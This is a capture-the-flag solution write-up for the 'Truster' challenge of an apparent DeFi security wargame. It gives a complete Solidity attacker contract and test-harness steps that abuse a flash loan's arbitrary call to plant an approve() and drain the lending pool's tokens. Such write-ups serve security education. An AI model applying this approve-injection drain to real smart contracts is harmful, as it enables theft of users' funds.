# Truster

**HINT:** Look at the parameters and the arguments of the function ```flashLoan()``` 

<details>
<summary>Part 1</summary>
<p>

What this will do is use the token's function ```approve()``` as an argument. Which in turn, has the data payload of our contract that will approve it to withdraw the funds of the lender Pool
```
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

interface ITrusterLenderPool {
    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

contract TrusterAttacker {
    using SafeMath for uint256;
    using Address for address payable;

    constructor() public {}
    
    function attack(IERC20 token, ITrusterLenderPool pool, address attackerEOA) public {
        uint256 poolBalance = token.balanceOf(address(pool));

        bytes memory approvePayload = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
        pool.flashLoan(0, attackerEOA, address(token), approvePayload);
        
        token.transferFrom(address(pool), attackerEOA, poolBalance);
    }
}
```

</p>
</details>

<details>
<summary>Part 2</summary>
<p>

Now go to ```truster.challenge.js``` and at the top of the file add:
```js
const TrusterAttacker = contract.fromArtifact("TrusterAttacker");
```
And at ```Exploit``` add:
```js
this.attacker = await TrusterAttacker.new({ from: attacker });
await this.attacker.attack(this.token.address, this.pool.address, attacker);
```

```sh
npm run truster.challenge.js
```
</p>
</details>
